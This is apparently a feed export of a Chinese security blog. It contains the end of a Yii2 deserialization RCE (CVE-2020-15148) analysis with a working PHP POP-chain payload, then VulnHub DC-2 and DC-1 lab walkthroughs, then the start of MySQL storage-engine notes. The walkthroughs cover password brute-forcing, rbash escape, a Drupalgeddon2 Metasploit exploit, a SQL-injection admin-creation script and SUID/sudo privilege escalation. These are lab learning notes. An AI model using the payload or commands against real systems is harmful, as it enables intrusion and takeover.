double-quoted-string">"extrader"</span> <span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"is"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"am"</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//注意 ClearAll中的数组解析了两次，之后再unlink</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XmlBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">XmlBuilder</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$__dom__</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">__dom__</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Covers</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$refers</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$description</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">description</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">refers</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"AnyStringisOK"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>            <span class="token comment">// run() -> call_user_func($this->checkAccess, $this->id);</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'saveXML'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>发包，成功命令执行</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513201308446.png" alt loading="lazy"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>发现这几个pop链用来用去最后都是靠着<code>__call</code>方法来触发代码执行，代码审计的少，以后再遇到代码审计的问题可以多多考虑这一方面的东西</li><li>善于搜索，使用正则表达式，比如满足<code>\$this-&gt;(\w+)-&gt;(\w+)\(\)</code>这个正则的就可能可以触发<code>__call</code>方法</li><li>找链的开端可以尝试从<code>__destruct</code>入手，然后追链，追方法</li><li><code>call_user_func</code>中的<code>callback</code>可以是数组</li><li>整个pop链下来还是学到不少东西的，慢慢来吧</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://v0w.top/2020/09/22/Yii2unserialize/">Yii2 反序列化（CVE-2020-15148）学习笔记</a></li><li><a href="https://forum.butian.net/share/56">Yii反序列化漏洞复现到新利用链发现</a></li><li><a href="https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA">CVE-2020-15148 Yii2反序列化RCE POP链分析</a></li><li><a href="https://www.anquanke.com/post/id/217930">我是如何挖掘yii2反序列化0day的</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Yii2介绍&quot;&gt;&lt;a href=&quot;#Yii2介绍&quot; class=&quot;headerlink&quot; title=&quot;Yii2介绍&quot;&gt;&lt;/a&gt;Yii2介绍&lt;/h3&gt;&lt;p&gt;Yii 是一个高性能，基于组件的 PHP 框架，用于快速开发现代 Web 应用程序。即可以用于开发各种用 P
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://www.extrader.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="代码审计" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub-DC-2靶场练习</title>
    <link href="https://www.extrader.top/posts/ce8eed56/"/>
    <id>https://www.extrader.top/posts/ce8eed56/</id>
    <published>2021-05-02T13:45:30.000Z</published>
    <updated>2021-07-05T14:17:44.708Z</updated>
    
    <content type="html"><![CDATA[<p>靶机地址：192.168.99.150（DC-2）<a href="https://www.vulnhub.com/entry/dc-2,311/">链接</a></p><p>渗透机：192.168.99.188（Kali）</p><p>物理主机：192.168.99.107（Windows10）</p><p>目标：尽可能拿到更多的flag，有5个</p><p>nmap主机发现：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502172127928.png" alt loading="lazy"></p><p>访问80端口，发现是一个WordPress站点，首页有flag1，如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502172310497.png" alt loading="lazy"></p><p>似乎是让我们对用户进行爆破，但常规的密码字典里可能没有我们所需要的密码，于是采用<code>Cewl</code>进行密码信息搜集</p><pre class="language-none"><code class="language-none">cewl http:&#x2F;&#x2F;dc-2&#x2F; -m 3 -d 3 -e -v -w wppass.txt-m 最小单词长度-d：爬网深度-e：收集包含email地址信息-v：Verbose模式，该模式下，Cewl会导出目标网站的详细数据-w：保存字典文件</code></pre><p>得到字典后使用wpscan对网站后台进行扫描测试</p><pre class="language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P &#x2F;home&#x2F;kali&#x2F;msf_exp&#x2F;wppass.txt-e: 枚举 u表示枚举用户-P: 爆破密码字典路径</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502173058881.png" alt loading="lazy"></p><p>拿到两个用户的用户名和密码</p><pre class="language-none"><code class="language-none">Username: jerry, Password: adipiscingUsername: tom, Password: parturient</code></pre><p>登录后台，在page里拿到flag2</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502173751322.png" alt loading="lazy"></p><p>找其它的切入点，前面nmap在0-1000的端口中只扫到了一个80端口，加大力度，改成0-10000</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174409458.png" alt loading="lazy"></p><p>扫到一个7744的ssh端口，tom用户连上使用wp的后台密码即可登录，jerry不行，可能不是这个密码，也可能jerry不允许ssh登录</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174816845.png" alt loading="lazy"></p><p>登录目录下找到flag3，less查看</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174852430.png" alt loading="lazy"></p><p>随后尝试很多命令用不了，当前目录下的usr目录也进不去，查看当前目录下所有文件，查看<code>.bash_history</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502175516495.png" alt loading="lazy"></p><p><code>ls -al usr/bin</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502175312778.png" alt loading="lazy"></p><p>有四个命令可以用，并且使用的是rbash，一个功能受限的bash，限制性可能会有如下</p><ul><li>使用命令cd更改目录</li><li>设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）</li><li>指定包含参数<code>&#39;/&#39;</code>的文件名</li><li>指定包含参数<code>&#39; - &#39;</code>的文件名</li><li>使用重定向输出<code>&#39;&gt;&#39;, &#39;&gt;&gt;&#39;, &#39;&gt; |&#39;, &#39;&lt;&gt;&#39; &#39;&gt;&amp;&#39;,&#39;&amp;&gt;&#39;</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502193832294.png" alt loading="lazy"></p><p>使用scp绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502193742568.png" alt loading="lazy"></p><p>还可以这样</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200235932.png" alt loading="lazy"></p><p>也可以用vi，方法不唯一，搬张图，可参考文末的链接</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200311594.png" alt loading="lazy"></p><p>在jerry的用户目录下找到<code>flag4.txt</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200512732.png" alt loading="lazy"></p><p><code>you&#39;re on your own now.  :-)</code>，线索<code>git</code></p><p>配置当前shell环境变量</p><pre class="language-none"><code class="language-none">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502211021164.png" alt loading="lazy"></p><p>大部分命令可用了</p><p>根据flag3的提示，su切换到jerry，密码就是上面的密码，<code>sudo -l</code>看看用户可以用sudo运行一些命令</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502213404125.png" alt loading="lazy"></p><p>git可用，git提权</p><pre class="language-none"><code class="language-none">sudo git help config  在末行命令模式输入 !&#x2F;bin&#x2F;bash 或 !&#39;sh&#39;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502213732806.png" alt loading="lazy"></p><p>成功拿到最后的flag    </p><p><strong>参考：</strong></p><ul><li><a href="https://cloud.tencent.com/developer/article/1680551">RBash - 受限的Bash绕过</a></li><li><a href="https://www.const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Linux 提权总结</a></li><li><a href="https://www.secpulse.com/archives/72965.html">利用通配符实现Linux本地提权</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;靶机地址：192.168.99.150（DC-2）&lt;a href=&quot;https://www.vulnhub.com/entry/dc-2,311/&quot;&gt;链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;渗透机：192.168.99.188（Kali）&lt;/p&gt;
&lt;p&gt;物理主机：192.168.99.
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://www.extrader.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="靶机" scheme="https://www.extrader.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub-DC-1靶场练习</title>
    <link href="https://www.extrader.top/posts/5787bcec/"/>
    <id>https://www.extrader.top/posts/5787bcec/</id>
    <published>2021-05-01T13:20:30.000Z</published>
    <updated>2021-07-05T14:17:47.615Z</updated>
    
    <content type="html"><![CDATA[<p>靶机使用VMware搭建，网络为桥接模式，也可使用NAT模式</p><p>操作不难，主要学思路和方法，老是看别人渗透操作感觉我上我也行，但实际上自己真正的来操作了就知道了，越到后面就越不知道从何入手。。。</p><p>靶机：192.168.99.170（DC-1），<a href="https://www.vulnhub.com/entry/dc-1,292/">vulnhub地址</a></p><p>渗透机：192.168.99.188（Kali）</p><p>物理主机：192.168.99.107（Windows10）</p><p>目标：尽可能拿到更多的flag</p><p>nmap主机发现：</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -sP -PR 192.168.99.1&#x2F;24-sP: Ping Scan - go no further than determining if host is online-PR: ARP Ping</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501114628048.png" alt loading="lazy"></p><p>找到靶机地址，对靶机端口进行扫描：</p><pre class="language-shell" data-language="shell"><code class="language-shell">sudo nmap -T4 -A -sN 192.168.99.170-sN: TCP Null, FIN, and Xmas scans-A: Enables OS detection and Version detection</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501115129119.png" alt loading="lazy"></p><p>查看80端口有http服务开放，打开发现是一个Drupal站点，版本为Drupal 7，网上搜有18年的代码执行漏洞（CVE-2018-7600）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501155026635.png" alt loading="lazy"></p><p>上msf，<code>search drupal</code>，用18年的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501155618792.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2set RHOSTS 192.169.99.170exploit</code></pre><p>成功弹回一个shell</p><p>查看系统信息<code>sysinfo</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501164905497.png" alt loading="lazy"></p><p>进入系统shell，查看当前用户为www-data</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501165519887.png" alt loading="lazy"></p><p>搜集信息</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501161345481.png" alt loading="lazy"></p><p>拿到flag1，<code>Every good CMS needs a config file - and so do you.</code>，根据提示找配置文件</p><p><code>search -f setting*</code> 或<code>find . -type f | xargs grep &quot;password&quot;</code>找setting开头的文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501163530112.png" alt loading="lazy"></p><p><code>download ./sites/default/settings.php /home/kali/</code>下载下来看看</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501163755265.png" alt loading="lazy"></p><p>拿到flag2，数据库用户账号密码</p><pre class="language-none"><code class="language-none">dictionary attacks aren&#39;t theonly ways to gain access (and you WILL need access).What can you do with these credentials?&#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,&#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</code></pre><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>进入一个交互式的shell，为什么要用交互式shell，因为非交互shell无回显，<a href="https://blog.csdn.net/gui951753/article/details/79154496">详见</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501165847912.png" alt loading="lazy"></p><p><code>mysql -udbuser -pR0ck3t</code>登录<code>mysql</code>命令行</p><p><code>select * from users \G;</code> </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501202239805.png" alt loading="lazy"></p><p>admin密码加密的，这里有两个方法可以拿到后台管理员的账号</p><p>一个是把数据库中admin的密码给改成我们想要的密码，前提是要经过<code>Drupal</code>后端加密的才行</p><p>在网站根目录<code>scripts</code>找到加密脚本，<a href="http://drupalchina.cn/node/2128">参考</a></p><p>执行加密脚本<code>php scripts/password-hash.sh 123456</code>，得到<code>123456</code>加密后的密码<code>$S$DO3Rg8SH1xaO3lXuF8sKc8905t0xwoMMO80Ikju//Ia1JwdtrWz5</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501202852481.png" alt loading="lazy"></p><p>在数据库中<code>update</code>管理员的密码，即可用更改后的密码登录</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501203540144.png" alt loading="lazy"></p><p>还有一种方法，<code>searchsploit drupal</code>发现<code>Drupal 7.0 &lt; 7.31</code>版本存在SQL注入，可以直接添加管理员账号，<a href="https://www.exploit-db.com/exploits/34992">详见</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204048208.png" alt loading="lazy"></p><p><code>python 34992.py -t http://192.168.99.170 -u extrader -p 123456</code> 即可添加管理员用户</p><p>登录后台</p><p>content里找到flag3</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204137968.png" alt loading="lazy"></p><p>暗示<code>shadow</code>，<code>cat /etc/passwd</code>，发现flag4用户</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204348304.png" alt loading="lazy"></p><p>在<code>/home/flag4</code>目录下找到<code>flag4.txt</code>文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501162541392.png" alt loading="lazy"></p><p>这里还可以用<code>hydra</code>爆破flag4的密码，虽然没啥用，学操作就够了</p><pre class="language-none"><code class="language-none">-l 指定用户名-P 加载密码字典（自定义)ssh:&#x2F;&#x2F;ip 指定使用协议和ip地址</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501210421392.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501210913760.png" alt loading="lazy"></p><pre class="language-none"><code class="language-none">Can you use this same method to find or access the flag in root?Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></pre><p>意思要我们提权</p><p>suid提权</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>找到一个属于root的有s权限的文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501205439109.png" alt loading="lazy"></p><p>提权，在<code>/root</code>目录下拿到最终的flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501205503876.png" alt loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;靶机使用VMware搭建，网络为桥接模式，也可使用NAT模式&lt;/p&gt;
&lt;p&gt;操作不难，主要学思路和方法，老是看别人渗透操作感觉我上我也行，但实际上自己真正的来操作了就知道了，越到后面就越不知道从何入手。。。&lt;/p&gt;
&lt;p&gt;靶机：192.168.99.170（DC-1），&lt;a
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://www.extrader.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="靶机" scheme="https://www.extrader.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MySQL学习笔记</title>
    <link href="https://www.extrader.top/posts/f12cbde5/"/>
    <id>https://www.extrader.top/posts/f12cbde5/</id>
    <published>2021-04-09T05:17:01.000Z</published>
    <updated>2021-04-10T12:08:09.609Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MySQL存储引擎"><a href="#MySQL存储引擎" class="headerlink" title="MySQL存储引擎"></a>MySQL存储引擎</h3><p>存储引擎是MySQL组件，用于处理不同类型的SQL操作。</p><p>使用 <a href="https://dev.mysql.com/doc/refman/5.7/en/show-engines.html"><code>SHOW ENGINES</code></a> 语句查看服务器支持哪些存储引擎，Support列中表示是否可以使用，DEFAULT表示默认值。（下图版本为MySQL 5.7.26，Windows 10）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409135417092.png" alt loading="lazy"></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html"><code>InnoDB</code></a> 是默认的且用途最广的存储引擎，Oracle官方建议将其用于表（特殊用例除外）。（默认情况下 ，MySQL 5.7 or MySQL 8.0 中使用  <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table.html"><code>CREATE TABLE</code></a> 语句创建<code>InnoDB</code>表。）</p><h4 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h4><p>事务型数据库的首选引擎，支持事务安全（ACID），具有提交（COMMIT），回滚（ROLLBACK）和奔溃恢复（crash-recovery）功能 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-acid.html">InnoDB and the ACID Model</a></p><p>行级锁定和Oracle风格的一致读取可提高多用户的并发性和性能 <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-locking-transaction-model.html">InnoDB Locking and Transaction Model</a></p><p>InnoDB将数据存放在磁盘上，以基于主键优化查询，每个InnoDB表都有一个称为聚集索引（The Clustered Index）的主键索引，该索引组织数据以最小化主键查找<code>I/O</code> <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-index-types.html">Clustered and Secondary Indexes</a></p><p>为了保持数据的完整性，InnoDB支持 <code>FOREIGN KEY</code> 约束，使用外键检查插入，更新和删除，以确保它们不会导致相关表之间的不一致。 <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table-foreign-keys.html">FOREIGN KEY Constraints</a></p><p><strong>ACID</strong></p><ul><li><p>原子性（Atomicity）</p><p>一个事务要么全部提交成功，要么全部回滚失败，不能只执行其中的一部分操作</p></li><li><p>一致性（Consistency）</p><p>事务的执行不能破坏数据库的完整性和一致性，在一个事务在执行前后，数据库都必须处于一致性状态，以防止数据崩溃</p></li><li><p>隔离性（Isolation）</p><p>在并发的环境中，并发事务是相互隔离的，并发执行的事务直接不能互相干扰</p></li><li><p>持久性（Durability）</p><p>一旦事务提交，则对应数据库中的数据状态的变更就会永久的保存到数据库中</p></li></ul><p>一般来说，如果需要事务支持，并且有较高的并发读取频率，InnoDB首选</p><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><p>所有数据值首先存储在低字节中（The Low Byte First），这使得MyISAM独立于操作系统，可以轻松地将其从Windows服务器移植到Linux服务器</p><p>每个<code>MyISAM</code>表都以三个文件存储在磁盘上。这些文件具有以表名开头的名称，并具有用于指示文件类型的扩展名，<code>.frm</code> 文件存储表格式，<code>.MYD</code>（MYData）文件存储数据，<code>.MYI</code>（MYIndex）存储索引</p><p>支持并发插入，即适合在插入密集型表中使用，例如管理邮件或Web服务器日志数据</p><p>MyISAM存储引擎在筛选大量数据时非常迅速，适合插入密集型表</p><h4 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h4><p>将所有数据存储在RAM中，以便在需要快速查找非关键数据的环境中进行快速访问，当mysqld守护进程崩溃时，所有的Memory数据都会丢失。</p><p>要求存储在Memory数据表里的数据使用的是长度不变的格式，不支持可变长度数据类型（包括BLOB和TEXT），VARCHAR是一种长度可变的类型，但因为它在MySQL内部当做长度固定不变的CHAR类型，所以可以使用。</p><p>一般在目标数据较小，而且访问非常频繁适合使用，造成内存的使用可以通过参数<code>max_help_table_size</code>控制<code>Memory</code>表的大小，如果数据是临时的，而且要求必须被立即使用，就可以存放在内存表之中，若数据丢失，不会对应用服务产生实质的负面影响，Memory同时支持散列索引和B数索引。</p><h4 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h4><p>实际上是带有逗号分隔符的文本文件，CVS表允许以CSV格式导入或转储数据，以便与读取和写入相同格式的脚本和应用程序交换数据。</p><p>CSV 存储引擎因为自身文件格式的原因，所有列必须强制指定 NOT NULL 。</p><p>CSV 存储引擎也会包含一个存储表结构的 .frm 文件，还会创建一个 .csv 存储数据的文件，还会创建一个同名的元信息文件，该文件的扩展名为 .CSM ，用来保存表的状态及表中保存的数据量。每个数据行占用一个文本行。</p><h4 id="ARCHIVE"><a href="#ARCHIVE" class="headerlink" title="ARCHIVE"></a>ARCHIVE</h4><p>归档，仅支持最基本的插入和查询两种功能，MySQL 5.5以后的版本中开始支持索引，Archive拥有很好的压缩机制，它使用zlib压缩库，在记录被请求时会实时压缩，所以它经常被用来当做仓库使用。</p><h4 id="BLACKHOLE"><a href="#BLACKHOLE" class="headerlink" title="BLACKHOLE"></a>BLACKHOLE</h4><p>黑洞存储引擎，所有插入的数据并不会保存，BLACKHOLE 引擎表永远保持为空，写入的任何数据都会消失。</p><h3 id="InnoDB底层原理"><a href="#InnoDB底层原理" class="headerlink" title="InnoDB底层原理"></a>InnoDB底层原理</h3><p>架构图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409171932233.png" alt loading="lazy"></p><h4 id="Buffer-Pool"><a href="#Buffer-Pool" class="headerlink" title="Buffer Pool"></a>Buffer Pool</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">缓冲池</a></p><p>InnoDB为了做数据的持久化，会将数据存储到磁盘上。但是面对大量的请求时，CPU的处理速度和磁盘的IO速度之间差距太大，为了提高整体的效率， InnoDB引入了<strong>缓冲池</strong>。</p><p>缓冲池是内存中的一个区域，在InnoDB访问表和索引数据的时候会在其中进行高速缓存，缓冲池允许直接从内存访问经常使用的数据，从而加快了处理速度。在专用服务器上，通常将多达80％的物理内存分配给缓冲池。</p><p>为了提高大容量读取操作的效率，缓冲池被划分为多个页面，这些页面可以潜在地容纳多行，为了提高缓存管理的效率，使用最近最少使用（LRU）算法的变体，将很少使用的数据从缓存中老化掉。</p><p>如何利用缓冲池将经常访问的数据保留在内存中是MySQL调优的重要方面。</p><h4 id="Buffer-Pool-LRU-Algorithm"><a href="#Buffer-Pool-LRU-Algorithm" class="headerlink" title="Buffer Pool LRU Algorithm"></a>Buffer Pool LRU Algorithm</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">缓冲池LRU算法</a></p><p>缓冲池使用LRU算法的变体作为列表进行管理。当需要空间以将新页面添加到缓冲池时，将驱逐最近使用最少的页面，并将新页面添加到列表的中间。此中点插入策略将列表视为两个子列表：</p><ul><li><p>最前面是最近访问过的新页面（“年轻”） 的子列表</p></li><li><p>在末尾，是最近访问过的旧页面的子列表</p></li></ul><p>官方结构图如下：</p><p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-buffer-pool-list.png" alt loading="lazy"></p><ul><li>3/8的缓存池专用于旧的子列表</li><li>列表中点是新子列表的尾部与旧子列表的头部相交的界面</li><li>当InnoDB将页面读入缓冲池时，首先插入中点</li><li>访问旧子列表中的页面会使得其变为”年轻“，然后移至新子列表的开头</li><li>随着数据库的运行，通过移至列表的末尾，缓冲池中未访问的页面将“老化”，新的和旧的子列表中的页面都会随着其他页面的更新而老化，随着在中点插入页面，旧子列表中的页面也会老化。最终，未使用的页面到达旧子列表的尾部并被逐出。</li></ul><h4 id="Change-Buffer"><a href="#Change-Buffer" class="headerlink" 